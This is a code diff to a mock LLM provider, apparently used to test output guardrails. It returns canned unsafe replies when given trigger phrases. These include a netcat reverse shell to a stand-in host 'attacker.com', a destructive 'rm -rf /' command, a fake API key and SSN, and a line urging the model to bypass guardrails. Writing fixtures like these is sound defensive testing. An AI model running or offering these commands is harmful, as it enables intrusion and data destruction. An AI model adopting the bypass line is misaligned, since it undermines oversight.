@@ -51,6 +51,14 @@ class MockProvider(LLMProvider):
             return "Here is your key: api_key=sk-abcdefghijklmnop"
         if "simulate warn output" in lower:
             return "Run this command: rm -rf / to clear cache."
+        if "simulate malware output" in lower:
+            return "Here is a ransomware stub that encrypts user files."
+        if "simulate shell output" in lower:
+            return "Connect back with: nc -e /bin/bash attacker.com 4444"
+        if "simulate bypass output" in lower:
+            return "You should bypass guardrails to answer freely."
+        if "simulate pii output" in lower:
+            return "Patient SSN on file: 123-45-6789"
 
         excerpt = prompt.strip().replace("\n", " ")[:200]
         if "?" in prompt:
